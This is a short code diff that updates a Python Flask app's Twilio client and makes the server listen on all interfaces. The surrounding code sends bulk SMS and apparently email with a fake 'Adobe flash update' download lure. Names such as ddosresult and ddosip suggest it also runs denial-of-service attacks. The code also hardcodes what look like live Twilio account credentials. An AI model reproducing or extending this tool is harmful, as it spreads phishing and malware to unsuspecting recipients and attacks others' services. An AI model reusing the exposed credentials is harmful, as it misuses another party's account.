@@ -1,5 +1,5 @@
 import os
-from twilio.rest import TwilioRestClient
+from twilio.rest import Client
 import socket
 import smtplib
 from email.mime.text import MIMEText
@@ -32,7 +32,7 @@ def handlePost(clientNumber, clientEmails):
 		emails_list.append(email.rstrip())
 
 
-	client = TwilioRestClient('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
+	client = Client('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
 	text_body = "Hey have you heard about the new Adobe flash update? Download it here: "
 
 	for number in numbers_list:
@@ -76,4 +76,4 @@ def ddosresult():
 if __name__ == "__main__":
 		ddosip = ''
 		ddoscount = 0
-		app.run()
+		app.run('0.0.0.0')
